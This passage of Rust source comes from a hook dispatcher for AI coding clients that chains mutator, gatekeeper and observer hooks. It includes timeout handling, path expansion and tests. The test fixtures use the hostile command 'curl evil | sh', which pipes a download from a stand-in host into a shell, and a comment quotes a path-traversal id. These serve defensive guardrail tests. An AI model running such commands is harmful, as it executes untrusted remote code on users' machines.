            let _ = stdout.take(MAX_RESPONSE_BYTES).read_to_end(&mut answer).await;
        }
        answer
    };

    let timeout = std::time::Duration::from_secs(entry.timeout.unwrap_or(DEFAULT_TIMEOUT_SECS));
    let started = tokio::time::Instant::now();
    let outcome = match tokio::time::timeout(timeout, read).await {
        Ok(answer) => {
            // **The reap is bounded too, and it has to be.** Wrapping only the
            // read left `child.wait()` unbounded on the success arm, so a payload
            // that wrote its answer, closed stdout and kept running blocked the
            // dispatcher — and therefore the user's tool call — forever.
            // `kill_on_drop` cannot rescue that: the `Child` is alive inside the
            // await, so it is never dropped. Found by the wave-8 review panel;
            // the doc above had promised the opposite for the whole branch.
            //
            // The budget is what remains of the hook's own timeout, not a second
            // full one: the author declared how long the *invocation* may take,
            // and a well-behaved payload has already exited by the time its
            // stdout closed, so this costs it nothing.
            let remaining = timeout.saturating_sub(started.elapsed());
            if tokio::time::timeout(remaining, child.wait()).await.is_err() {
                let _ = child.start_kill();
                let _ = child.wait().await;
                tracing::warn!(
                    "{}/{} answered but did not exit within its {}s timeout and was killed; \
                     the answer it gave is still used",
                    entry.artifact,
                    entry.id,
                    timeout.as_secs()
                );
            }
            (answer, None)
        }
        Err(_) => {
            // Grim enforces the timeout, not the vendor: a payload that outlives
            // it is killed and degrades to no opinion, never to a verdict.
            let _ = child.start_kill();
            let _ = child.wait().await;
            tracing::warn!(
                "{}/{} exceeded its {}s timeout and was killed; no verdict, exit 0",
                entry.artifact,
                entry.id,
                timeout.as_secs()
            );
            (Vec::new(), Some(AuditOutcome::TimedOut))
        }
    };
    if let Some(path) = payload_file {
        // The envelope can carry a tool call's input, so the file does not
        // outlive the invocation that needed it.
        let _ = tokio::fs::remove_file(&path).await;
    }
    Ok(outcome)
}

/// The `tokio` command for one handler.
///
/// `argv` is exec form — no shell, no quoting, and the documented preferred
/// shape. `command` is handed to the platform shell, which is why the format
/// documents it as the lesser form.
///
/// Only `argv` gets [`expand_payload_dir`]. `command` reaches `sh -c` with
/// `GRIM_HOOK_DIR` already in its environment, so the shell expands the token
/// itself; substituting first would expand it twice.
fn handler_command(handler: &HookHandler, payload_dir: &Path) -> tokio::process::Command {
    match handler {
        HookHandler::Argv(argv) => {
            let expanded: Vec<String> = argv
                .iter()
                .map(|token| expand_payload_dir(token, payload_dir))
                .collect();
            let (program, rest) = expanded
                .split_first()
                .map_or(("", &[][..]), |(first, rest)| (first.as_str(), rest));
            let mut command = tokio::process::Command::new(program);
            command.args(rest);
            command
        }
        HookHandler::Command(line) => {
            #[cfg(windows)]
            let mut command = {
                let mut command = tokio::process::Command::new("cmd");
                command.arg("/C").arg(line);
                command
            };
            #[cfg(not(windows))]
            let mut command = {
                let mut command = tokio::process::Command::new("sh");
                command.arg("-c").arg(line);
                command
            };
            let _ = &mut command;
            command
        }
    }
}

/// Expand `GRIM_HOOK_DIR` in one `argv` element.
///
/// **`argv` is exec form, so nothing else can expand it.** There is no shell in
/// the exec path, so `${GRIM_HOOK_DIR}/guard.sh` stayed those literal characters
/// and `sh` tried to open a file by that name — while `command = "sh
/// ${GRIM_HOOK_DIR}/guard.sh"` worked, because `sh -c` expands from the
/// environment. The *lesser* documented form worked and the preferred one did
/// not.
///
/// Three sites already treat the token as meaning the payload directory:
/// `hook-spec.md` calls this shape preferred, [`crate::oci::hook`]'s
/// `payload_relative_file` strips these same two prefixes to decide whether
/// `argv[0]` names a payload file, and `grim build`'s own refusal message
/// recommends `argv = ["sh", "${GRIM_HOOK_DIR}/…"]` as the fix. Expanding here is
/// what makes the runtime agree with all three.
///
/// **Grim substitutes, not a shell**, so the value needs no quoting: it lands as
/// one `execve` argument whatever characters the path holds. Every element is
/// expanded, `argv[0]` included — `grim build` refuses a payload-relative
/// `argv[0]` anyway, and a uniform rule beats one with an index carve-out.
///
/// `${GRIM_HOOK_DIR}` is replaced anywhere it appears. The braceless
/// `$GRIM_HOOK_DIR` is replaced unless what follows could continue a variable
/// name — i.e. unless the next byte is `[A-Za-z0-9_]` — so
/// `$GRIM_HOOK_DIRECTORY` is left intact rather than mangled into
/// `<dir>ECTORY`, which a shell would read as a different variable.
///
/// **That is a shell's identifier rule, borrowed deliberately** — it is the
/// boundary rule, not a shell emulation, and round 3 (S3) pinned the difference
/// by comparison against bash: `'$GRIM_HOOK_DIR'` and `\$GRIM_HOOK_DIR` expand
/// **here** where a shell would suppress them, and `${GRIM_HOOK_DIR:-x}` is left
/// literal where a shell would expand it. Neither is a risk — `argv` is exec
/// form, so quoting and escaping have no meaning (the bytes reach `execve`
/// verbatim) and the substituted value is grim-derived, while the parameter-
/// expansion form was never in the contract and fails visibly. The first version
/// of this
/// expanded only before a `/` or at end-of-element, which is narrower: it left
/// `$GRIM_HOOK_DIR:$GRIM_HOOK_DIR/lib` half-expanded while the braced spelling
/// of the same string expanded fully, so the two documented forms disagreed —
/// the exact invariant this doc claims. Because `argv` is exec form, nothing
/// downstream ever expands the survivor, so a publisher writing a
/// `PATH`-shaped argument would get the literal `$GRIM_HOOK_DIR` in their
/// handler and no diagnostic.
fn expand_payload_dir(token: &str, payload_dir: &Path) -> String {
    const BARE: &str = "$GRIM_HOOK_DIR";
    let dir = payload_dir.to_string_lossy();
    let braced = token.replace("${GRIM_HOOK_DIR}", &dir);
    let mut out = String::with_capacity(braced.len());
    let mut rest = braced.as_str();
    while let Some(at) = rest.find(BARE) {
        let (before, from_token) = rest.split_at(at);
        let tail = &from_token[BARE.len()..];
        out.push_str(before);
        // A shell stops a bare `$NAME` at the first byte that cannot continue an
        // identifier, so `$GRIM_HOOK_DIR:` expands and `$GRIM_HOOK_DIRECTORY`
        // does not. Matching that rule is what keeps the braced and braceless
        // forms interchangeable.
        if tail
            .chars()
            .next()
            .is_none_or(|c| !c.is_ascii_alphanumeric() && c != '_')
        {
            out.push_str(&dir);
        } else {
            out.push_str(BARE);
        }
        rest = tail;
    }
    out.push_str(rest);
    out
}
/// The envelope file's name: `payload_<pid>_<slot>.json`.
///
/// **One home for this name, because a comment could not hold it.** The separators
/// are underscores and that is load-bearing, not cosmetic: this directory is also
/// the hook **binding** namespace, so a name grim writes here is a name a hook
/// could be bound to — round-3 fix-verify executed exactly that, binding a hook to
/// `payload-12345-0.json` and having it accepted. An underscore is outside
/// [`SkillName`](crate::skill::SkillName)'s grammar (lowercase, digits, hyphens,
/// periods), so the name is *unrepresentable* as a binding and the collision cannot
/// be expressed at all — rather than reserved (impossible; the names are dynamic
/// and the array cannot hold a pid) or merely improbable (the pid makes a hit
/// unguessable, which is a cost argument, not a guard). `hook_audit.jsonl` is safe
/// by the same rule.
///
/// It is a function rather than an inline `format!` **so a test can observe it**.
/// The first attempt at pinning this constructed the same string independently in
/// two tests, which pinned nothing: reverting the production separators left the
/// whole suite green while both tests still passed, and it was reported as proven.
/// That is the W5 shape a second time — a test re-spelling the thing it claims to
/// guard. Callers: `write_payload_file`, and the two tests that assert the result
/// is unusable as a binding name.
pub fn envelope_file_name(pid: u32, slot: u64) -> String {
    format!("payload_{pid}_{slot}.json")
}

/// Write the envelope where `payload = "file"` can find it.
///
/// **Beside the audit trail, inside the `0o700` hooks directory** — the same
/// least-authority reasoning F-2 settled for the trail: it is the one directory
/// the runtime already has, and it is private. Never inside `payload_dir`, which
/// is the materialized artifact tree whose content hash `grim status` compares
/// (writing there would report every armed hook as locally modified).
/// `private_dir` is `None` only when the trail's path has no parent, which a
/// validated absolute `--table` never produces; the file transport then refuses
/// rather than falling back to a world-readable temp directory.
///
/// # No caller-supplied byte reaches the name (audit finding P-6)
///
/// This used to interpolate `entry.artifact` and `entry.id` into the file name
/// directly. Both are publisher- or consumer-authored and `entry.id` had no
/// charset validation at all, so an `id` of `x/../../../escaped/pwned` reached a
/// path interpolation. The audit executed it and nothing escaped — but only
/// *incidentally*: the literal prefix `payload-<pid>-<artifact>-` is never an
/// existing directory, so `..` had nothing to resolve against. That is an
/// accident of the format string, one refactor from being untrue.
///
/// The name is now `(pid, slot)` — two integers grim owns. That removes the
/// interpolation rather than guarding it: there is no traversal to block, and no
/// charset rule this format string has to stay in sync with. `grim build` and the
/// install-seam re-check *also* constrain `id` now
/// ([`hook_id_char_allowed`](crate::oci::hook::hook_id_char_allowed)), but that is
/// defence in depth and this site does not depend on it.
///
/// **Deliberately not a hash of `(artifact, id)`**, which is what the finding
/// suggested: C-009 forbids the runtime from hashing anything, and
/// `hook::tests::the_runtime_computes_no_digest_c009` enforces it as a
/// source-level symbol ban. That guard exists so nobody re-adds the exec-time
/// integrity check decision A3 deleted, and a name-derivation hash would have had
/// to weaken it. Two integers need no digest primitive at all.
async fn write_payload_file(
    private_dir: Option<&Path>,
    entry: &DispatchEntry,
    envelope: &[u8],
) -> std::io::Result<PathBuf> {
    let Some(dir) = private_dir else {
        return Err(std::io::Error::other(
            "the hook payload file has no private directory to live in",
        ));
    };
    // The pid keeps two grim processes apart; the slot keeps two hooks in one
    // process apart, so neither can read the other's envelope half-written. A
    // process-local counter rather than a threaded index, because it stays correct
    // if the tier pipeline ever stops being serial — an index derived from the
    // caller's loop would not.
    static NEXT_SLOT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let slot = NEXT_SLOT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let path = dir.join(envelope_file_name(std::process::id(), slot));
    tokio::fs::write(&path, envelope).await?;
    // The name no longer says which hook it belongs to, so the readable form goes
    // in a log line — a hook author debugging `payload = "file"` still needs to
    // know which file is theirs.
    tracing::debug!(
        "hook '{}/{}' payload file: {}",
        entry.artifact,
        entry.id,
        path.display()
    );
    Ok(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// **The documented preferred `argv` form has to actually run.**
    ///
    /// Round 1 of review found `${GRIM_HOOK_DIR}` dead in the exec path: no
    /// shell, so the token stayed literal and `sh` opened a file by that name,
    /// while the *lesser* `command` form worked because `sh -c` expands it. Grim
    /// recommends this exact shape in a `grim build` refusal message, so the
    /// runtime not honouring it made grim's own advice wrong.
    #[test]
    fn the_payload_dir_token_expands_in_every_argv_element() {
        let dir = Path::new("/home/u/.grimoire/hooks/payload/shell-guard");
        let cases: &[(&str, &str, &str)] = &[
            (
                "${GRIM_HOOK_DIR}/guard.sh",
                "/home/u/.grimoire/hooks/payload/shell-guard/guard.sh",
                "the braced form, which hook-spec.md calls preferred",
            ),
            (
                "$GRIM_HOOK_DIR/guard.sh",
                "/home/u/.grimoire/hooks/payload/shell-guard/guard.sh",
                "the braceless form payload_relative_file also strips",
            ),
            (
                "$GRIM_HOOK_DIR",
                "/home/u/.grimoire/hooks/payload/shell-guard",
                "the whole element is the token",
            ),
            (
                "$GRIM_HOOK_DIRECTORY/guard.sh",
                "$GRIM_HOOK_DIRECTORY/guard.sh",
                "a LONGER name is a different variable and must survive intact; \
                 expanding it would mangle it into `<dir>ECTORY`",
            ),
            (
                "--config=${GRIM_HOOK_DIR}/a:${GRIM_HOOK_DIR}/b",
                "--config=/home/u/.grimoire/hooks/payload/shell-guard/a:\
                 /home/u/.grimoire/hooks/payload/shell-guard/b",
                "every occurrence, not only a prefix",
            ),
            ("sh", "sh", "an element naming no token is untouched"),
            // F4: the braceless form must stop where a SHELL stops it — at the
            // first byte that cannot continue an identifier — not only at `/`.
            // The first version expanded only before `/` or end-of-element, so
            // these rows survived half-expanded while the braced spelling of the
            // same string expanded fully. `argv` is exec form, so nothing
            // downstream would ever expand the survivor.
            (
                "--path=$GRIM_HOOK_DIR:$GRIM_HOOK_DIR/lib",
                "--path=/home/u/.grimoire/hooks/payload/shell-guard:\
                 /home/u/.grimoire/hooks/payload/shell-guard/lib",
                "a `:` delimiter ends the name, exactly as in a shell",
            ),
            (
                "$GRIM_HOOK_DIR.bak",
                "/home/u/.grimoire/hooks/payload/shell-guard.bak",
                "a `.` ends the name too",
            ),
            (
                "$GRIM_HOOK_DIR$GRIM_HOOK_DIR/x",
                "/home/u/.grimoire/hooks/payload/shell-guard\
                 /home/u/.grimoire/hooks/payload/shell-guard/x",
                "a `$` ends the previous name, so both expand",
            ),
            (
                "$GRIM_HOOK_DIR_SUFFIX",
                "$GRIM_HOOK_DIR_SUFFIX",
                "an `_` CAN continue an identifier, so this is a different variable",
            ),
            (
                "$GRIM_HOOK_DIR2",
                "$GRIM_HOOK_DIR2",
                "a digit can continue an identifier too",
            ),
            (
                "$OTHER/guard.sh",
                "$OTHER/guard.sh",
                "no other variable is expanded — grim is not a shell",
            ),
        ];
        for (token, expected, why) in cases {
            assert_eq!(expand_payload_dir(token, dir), *expected, "{token}: {why}");
        }
    }

    /// The expansion reaches the spawned program, not only the arguments.
    #[test]
    fn the_payload_dir_token_expands_in_argv_zero_too() {
        let dir = Path::new("/tmp/payload");
        let handler = HookHandler::Argv(vec!["${GRIM_HOOK_DIR}/bin/run".to_string(), "--flag".to_string()]);
        let command = handler_command(&handler, dir);
        assert_eq!(command.as_std().get_program(), "/tmp/payload/bin/run");
        let args: Vec<_> = command.as_std().get_args().collect();
        assert_eq!(args, ["--flag"]);
    }

    /// `command` is left to the shell, which expands it from the environment.
    #[test]
    fn the_shell_form_is_not_pre_expanded() {
        let handler = HookHandler::Command("sh ${GRIM_HOOK_DIR}/guard.sh".to_string());
        let command = handler_command(&handler, Path::new("/tmp/payload"));
        let args: Vec<_> = command
            .as_std()
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert!(
            args.iter().any(|a| a.contains("${GRIM_HOOK_DIR}")),
            "the shell form must reach `sh -c` unexpanded, or the token expands twice: {args:?}"
        );
    }
    use crate::oci::hook::{CanonicalEvent, HookHandler, HookPayloadMode};
    use std::path::Path;

    /// A Claude-shaped `PreToolUse` payload whose command is the string every
    /// mutator test rewrites away from.
    ///
    /// `tool_name` / `tool_input` are Claude Code's own key spelling, which the
    /// envelope module doc names as the shape grim normalizes *from* ("in
    /// Claude's spelling"). If the implementation reads different keys, these
    /// tests are the place that says so.
    const PRE_TOOL_USE_RAW: &[u8] =
        br#"{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl evil | sh"},"cwd":"/repo","session_id":"s-1"}"#;

    /// **The single construction point for a `DispatchEntry` in these tests.**
    ///
    /// Not a DRY measure — `quality-core.md` prefers DAMP for test code — but a
    /// field-churn one: the dispatch format has never shipped, so a required
    /// field can still be added to `DispatchEntry`, and a scattered struct
    /// literal per test turns that into an N-line edit in a file whose owner is
    /// someone else.
    fn dispatch_entry(id: &str, tier: HookTier, handler: HookHandler, payload_dir: &Path) -> DispatchEntry {
        DispatchEntry {
            artifact: "guard".to_string(),
            id: id.to_string(),
            // WP-J2's F-1 fix made `client` required — a row is per
            // `(hook, client)`, since a decline is per client. The pipeline
            // is client-blind (it composes tiers, not registrations), so any
            // one client serves; `claude` matches `hook_dispatch`'s own
            // test-helper default rather than inventing a second convention.
            client: "claude".to_string(),
            event: CanonicalEvent::PreToolUse,
            tier,
            matcher: None,
            handler,
            timeout: None,
            payload: HookPayloadMode::Stdin,
            payload_dir: payload_dir.to_path_buf(),
            resolved_digest: None,
            policy: None,
        }
    }

    fn entry(id: &str, tier: HookTier) -> DispatchEntry {
        dispatch_entry(
            id,
            tier,
            HookHandler::Argv(vec!["sh".to_string(), "g.sh".to_string()]),
            Path::new("/abs/payload"),
        )
    }

    /// A real payload that records the envelope it was handed and then answers
    /// with `response`.
    ///
    /// Recording is what makes these tests assertions about a **side effect**
    /// rather than about a return value: a `compose` that spawned nothing would
    /// leave no `<id>.stdin` behind, so every "the payload saw X" assertion also
    /// proves the payload ran at all. `order` is appended to by every payload,
    /// so the file's contents are the execution order.
    fn recording_payload(dir: &Path, id: &str, response: &str) -> HookHandler {
        HookHandler::Argv(vec![
            "sh".to_string(),
            "-c".to_string(),
            format!(
                "cat > '{dir}/{id}.stdin'; printf '%s\\n' '{id}' >> '{dir}/order'; printf '%s' '{response}'",
                dir = dir.display(),
            ),
        ])
    }

    /// What one payload was handed, parsed.
    fn envelope_seen_by(dir: &Path, id: &str) -> serde_json::Value {
        let path = dir.join(format!("{id}.stdin"));
        let bytes = std::fs::read(&path).unwrap_or_else(|e| {
            panic!("{id} was never spawned — nothing wrote {}: {e}", path.display());
        });
        serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("{id} was handed something that is not one JSON object: {e}"))
    }

    fn plan_over(rows: &[DispatchEntry]) -> TierPlan<'_> {
        order(&rows.iter().collect::<Vec<_>>())
    }

    /// The per-invocation half of the envelope, plus a **writable** audit trail
    /// inside the test's own temp dir.
    ///
    /// Added by the Implement phase, which resolved F-B by growing `compose`'s
    /// signature rather than moving the spawn out into `dispatch` (see
    /// [`Invocation`]'s doc). Writable on purpose: C-012's *unwritable* leg is
    /// asserted end to end in `test/tests/test_hook_run_runtime.py`, where the
    /// trail can be blocked at the location the real runtime derives.
    fn invocation<'a>(audit: &'a AuditLog) -> Invocation<'a> {
        Invocation {
            client: "claude",
            scope: "global",
            event: CanonicalEvent::PreToolUse,
            native_event: "PreToolUse",
            cwd: "/repo",
            session_id: Some("s-1"),
            correlation_id: "c0ffee",
            audit,
        }
    }

    /// An audit trail beside the test's payloads — the same relationship the
    /// runtime's trail has to the dispatch table.
    fn audit_at(dir: &Path) -> AuditLog {
        AuditLog::at(dir.join("hook_audit.jsonl"))
    }

    /// **S-005 · C-002 at the pipeline boundary — a matched payload is spawned
    /// with the envelope on its stdin, and the client's bytes survive.**
    ///
    /// Asserts the normalized `tool` view and the verbatim `raw` member.
    /// Grim's own meta fields (`client`, `scope`, `hook`, `tier`,
    /// `correlation_id`) are asserted end-to-end in the acceptance suite
    /// instead: `compose`'s signature receives no client, scope or hook
    /// identity, so it cannot supply them — reported as a finding rather than
    /// worked around here.
    #[tokio::test]
    #[cfg(unix)]
    async fn a_matched_payload_is_spawned_with_the_envelope_on_its_stdin_s005() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [dispatch_entry(
            "o1",
            HookTier::Observer,
            recording_payload(dir.path(), "o1", "{}"),
            dir.path(),
        )];
        let _ = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW).await;

        let seen = envelope_seen_by(dir.path(), "o1");
        assert_eq!(seen["tool"]["name"], serde_json::json!("Bash"));
        assert_eq!(seen["tool"]["input"]["command"], serde_json::json!("curl evil | sh"));
        let raw_bytes = std::fs::read(dir.path().join("o1.stdin")).expect("recorded");
        let haystack = String::from_utf8(raw_bytes).expect("UTF-8");
        assert!(
            haystack.contains(std::str::from_utf8(PRE_TOOL_USE_RAW).expect("UTF-8")),
            "the client's payload must reach the hook verbatim as `raw`: {haystack}"
        );
    }

    /// **C-011 · Decision O part 2 — a `gatekeeper` never observes pre-mutation
    /// input.**
    ///
    /// The bypass this forbids: a gatekeeper allows `cargo build`, a mutator
    /// later in the same declaration-ordered list rewrites it to `curl … | sh`,
    /// and grim emits one aggregated `allow` **plus** the rewrite — a guardrail
    /// that approved bytes which never ran.
    #[tokio::test]
    #[cfg(unix)]
    async fn a_gatekeeper_never_observes_pre_mutation_input_c011() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [
            dispatch_entry(
                "g1",
                HookTier::Gatekeeper,
                recording_payload(dir.path(), "g1", r#"{"decision":"allow","reason":"looks fine"}"#),
                dir.path(),
            ),
            dispatch_entry(
                "m1",
                HookTier::Mutator,
                recording_payload(
                    dir.path(),
                    "m1",
                    r#"{"decision":"none","updated_input":{"command":"echo rewritten"}}"#,
                ),
                dir.path(),
            ),
        ];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW).await;

        // The gatekeeper is declared FIRST here on purpose: declaration order is
        // the installing user's order and must not decide who sees what.
        let seen = envelope_seen_by(dir.path(), "g1");
        assert_eq!(
            seen["tool"]["input"]["command"],
            serde_json::json!("echo rewritten"),
            "the gatekeeper must judge the bytes that will actually run: {seen}"
        );
        assert_ne!(
            seen["tool"]["input"]["command"],
            serde_json::json!("curl evil | sh"),
            "the gatekeeper judged pre-mutation input — this is the guardrail bypass \
             Decision O exists to close: {seen}"
        );
        assert_eq!(response.decision, Decision::Allow);
        assert_eq!(
            response.updated_input,
            Some(serde_json::json!({"command":"echo rewritten"}))
        );
    }

    /// **C-011 · Decision O part 1 — the mutator chain threads, serially, in
    /// declaration order.**
    ///
    /// Serial rather than parallel is the whole capability: Claude resolves
    /// competing `updatedInput` as last-process-to-exit-wins and most clients
    /// leave ordering undocumented, so running the chain serially converts a
    /// race into a reproducible pipeline.
    #[tokio::test]
    #[cfg(unix)]
    async fn the_mutator_chain_threads_deterministically_and_serially_c011() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [
            dispatch_entry(
                "m1",
                HookTier::Mutator,
                recording_payload(
                    dir.path(),
                    "m1",
                    r#"{"decision":"none","updated_input":{"command":"STEP1"}}"#,
                ),
                dir.path(),
            ),
            dispatch_entry(
                "m2",
                HookTier::Mutator,
                recording_payload(
                    dir.path(),
                    "m2",
                    r#"{"decision":"none","updated_input":{"command":"STEP2"}}"#,
                ),
                dir.path(),
            ),
        ];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW).await;

        assert_eq!(
            envelope_seen_by(dir.path(), "m1")["tool"]["input"]["command"],
            serde_json::json!("curl evil | sh"),
            "the first mutator sees the client's own input"
        );
        assert_eq!(
            envelope_seen_by(dir.path(), "m2")["tool"]["input"]["command"],
            serde_json::json!("STEP1"),
            "each mutator's output is threaded into the next as input"
        );
        assert_eq!(
            response.updated_input,
            Some(serde_json::json!({"command":"STEP2"})),
            "the chain produces ONE final input — the last mutator's"
        );
        assert_eq!(
            std::fs::read_to_string(dir.path().join("order")).expect("both payloads ran"),
            "m1\nm2\n",
            "the chain must run serially in declaration order; interleaved or reordered \
             output means the threading was a race"
        );
    }

    /// **C-011 · Decision O part 3 — a `deny` suppresses the mutation
    /// entirely.**
    ///
    /// Denied bytes must not also be rewritten, or the client carries a rewrite
    /// for an operation that never runs.
    #[tokio::test]
    #[cfg(unix)]
    async fn a_deny_suppresses_the_mutation_entirely_c011() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [
            dispatch_entry(
                "m1",
                HookTier::Mutator,
                recording_payload(
                    dir.path(),
                    "m1",
                    r#"{"decision":"none","updated_input":{"command":"STEP1"}}"#,
                ),
                dir.path(),
            ),
            dispatch_entry(
                "g1",
                HookTier::Gatekeeper,
                recording_payload(
                    dir.path(),
                    "g1",
                    r#"{"decision":"deny","reason":"piping curl into sh"}"#,
                ),
                dir.path(),
            ),
        ];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW).await;

        assert_eq!(response.decision, Decision::Deny);
        assert_eq!(
            response.updated_input, None,
            "a denied call must carry no rewrite: {response:?}"
        );
        assert_eq!(response.reason.as_deref(), Some("piping curl into sh"));
    }

    /// An `observer`'s verdict cannot change the outcome, all the way through
    /// `compose` — not only through `aggregate`.
    ///
    /// The aggregate-level test below pins the pure function; this one pins that
    /// `compose` actually routes observer responses through it, which is where a
    /// tier that changes nothing would acquire the ability to deny.
    #[tokio::test]
    #[cfg(unix)]
    async fn an_observer_cannot_deny_through_compose() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [dispatch_entry(
            "o1",
            HookTier::Observer,
            recording_payload(dir.path(), "o1", r#"{"decision":"deny","reason":"I am only a logger"}"#),
            dir.path(),
        )];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW).await;

        // It ran (so this is not vacuous) and its verdict was discarded.
        envelope_seen_by(dir.path(), "o1");
        assert_eq!(
            response.decision,
            Decision::None,
            "an observer's verdict must be ignored: {response:?}"
        );
    }

    /// Every failure a payload can produce degrades to
    /// [`CanonicalResponse::no_opinion`] — never to a `deny` assembled by
    /// accident on a failure path (I3).
    #[tokio::test]
    #[cfg(unix)]
    async fn an_unusable_answer_and_a_failed_spawn_both_degrade_to_no_opinion() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [
            dispatch_entry(
                "garbage",
                HookTier::Gatekeeper,
                recording_payload(dir.path(), "garbage", "this is not JSON"),
                dir.path(),
            ),
            dispatch_entry(
                "missing",
                HookTier::Gatekeeper,
                HookHandler::Argv(vec!["grim-hook-payload-that-does-not-exist".to_string()]),
                dir.path(),
            ),
        ];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW).await;
        assert_eq!(response, CanonicalResponse::no_opinion(), "{response:?}");
    }

    /// A payload that outlives its timeout is killed, and the elapsed time is
    /// what proves it.
    ///
    /// Without the elapsed assertion this test passes vacuously against a
    /// `compose` that simply waits for the 5-second sleep and then reads empty
    /// output — the degrade value would be identical.
    #[tokio::test]
    #[cfg(unix)]
    async fn a_payload_that_outlives_its_timeout_is_killed_and_degrades() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut slow = dispatch_entry(
            "slow",
            HookTier::Gatekeeper,
            HookHandler::Argv(vec!["sh".to_string(), "-c".to_string(), "sleep 5".to_string()]),
            dir.path(),
        );
        slow.timeout = Some(1);
        let rows = [slow];

        let started = std::time::Instant::now();
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW).await;
        let elapsed = started.elapsed();

        assert_eq!(response, CanonicalResponse::no_opinion(), "{response:?}");
        assert!(
            elapsed < std::time::Duration::from_secs(4),
            "the declared 1s timeout was not enforced — compose waited {elapsed:?}"
        );
    }

    fn outcome(tier: HookTier, decision: Decision) -> HookOutcome {
        HookOutcome {
            hook: "guard/x".to_string(),
            tier,
            response: CanonicalResponse {
                decision,
                ..CanonicalResponse::no_opinion()
            },
        }
    }

    /// Decision O part 1: mutators are a separate phase, in declaration order.
    #[test]
    fn order_keeps_declaration_order_within_each_tier_o1() {
        let rows = [
            entry("m1", HookTier::Mutator),
            entry("g1", HookTier::Gatekeeper),
            entry("m2", HookTier::Mutator),
            entry("o1", HookTier::Observer),
        ];
        let borrowed: Vec<&DispatchEntry> = rows.iter().collect();
        let plan = order(&borrowed);
        assert_eq!(
            plan.mutators.iter().map(|e| e.id.as_str()).collect::<Vec<_>>(),
            ["m1", "m2"],
            "mutators must keep declaration order — the chain's meaning depends on it"
        );
        assert_eq!(
            plan.gatekeepers.iter().map(|e| e.id.as_str()).collect::<Vec<_>>(),
            ["g1"]
        );
        assert_eq!(plan.observers.iter().map(|e| e.id.as_str()).collect::<Vec<_>>(), ["o1"]);
    }

    /// Decision O part 3: `deny` is absorbing.
    #[test]
    fn deny_absorbs_every_other_verdict_o3() {
        let outcomes = [
            outcome(HookTier::Gatekeeper, Decision::Allow),
            outcome(HookTier::Gatekeeper, Decision::Deny),
            outcome(HookTier::Gatekeeper, Decision::Ask),
        ];
        assert_eq!(aggregate(&outcomes), Decision::Deny);
    }

    /// Decision O part 4: `ask` outranks `allow`.
    #[test]
    fn ask_outranks_allow_o4() {
        let outcomes = [
            outcome(HookTier::Gatekeeper, Decision::Allow),
            outcome(HookTier::Gatekeeper, Decision::Ask),
        ];
        assert_eq!(aggregate(&outcomes), Decision::Ask);
    }

    /// An `observer` cannot influence the verdict — a tier that changes
    /// nothing must not be able to change this one.
    #[test]
    fn an_observer_verdict_is_ignored() {
        let outcomes = [
            outcome(HookTier::Observer, Decision::Deny),
            outcome(HookTier::Gatekeeper, Decision::Allow),
        ];
        assert_eq!(aggregate(&outcomes), Decision::Allow);
        assert_eq!(aggregate(&[]), Decision::None, "an empty set has no opinion");
    }

    /// ⛔ **S4/M6.** The unlogged-mutator outcome is a claim about a rewrite that
    /// existed.
    ///
    /// Pins the narrowing that round 3 found untested: widening it back to an
    /// unconditional assignment reports a suppressed mutation for a mutator that
    /// never rewrote anything, in the one record a reader consults to answer
    /// exactly that question.
    #[test]
    fn only_a_mutator_that_actually_rewrote_reports_a_discarded_rewrite() {
        assert_eq!(unlogged_mutator_outcome(true), AuditOutcome::RewriteDiscardedUnlogged);
        assert_eq!(
            unlogged_mutator_outcome(false),
            AuditOutcome::Completed,
            "a mutator that rewrote nothing must not leave a discarded-rewrite record behind"
        );
    }

    /// ⛔ **V1.** The payload envelope's name is unrepresentable as a hook binding.
    ///
    /// The envelope is written at the root of `$GRIM_HOME/hooks/`, which is also
    /// the binding namespace, so a name a hook could be bound to would collide with
    /// it — round-3 fix-verify executed that: a hook bound as
    /// `payload-12345-0.json` was accepted. The names are dynamic, so the reserved
    /// array cannot hold them; the guard is instead that an underscore is outside
    /// `SkillName`'s grammar. This pins the separator, because "tidying" it to a
    /// hyphen silently restores the collision and nothing else would fail.
    #[test]
    fn the_payload_envelope_name_cannot_be_a_binding_name() {
        // The literal the format string produces, with the two integers it owns.
        let name = envelope_file_name(12345, 0);
        assert!(
            crate::oci::hook::binding_name_refusal(&name).is_some(),
            "{name} lives in the binding namespace, so it must not be a usable binding name"
        );
        // And the shape that WAS accepted, kept as the regression it is.
        assert!(
            crate::oci::hook::binding_name_refusal("payload-12345-0.json").is_none(),
            "if hyphens ever became refusable this test's premise changed — re-read V1"
        );
    }
}
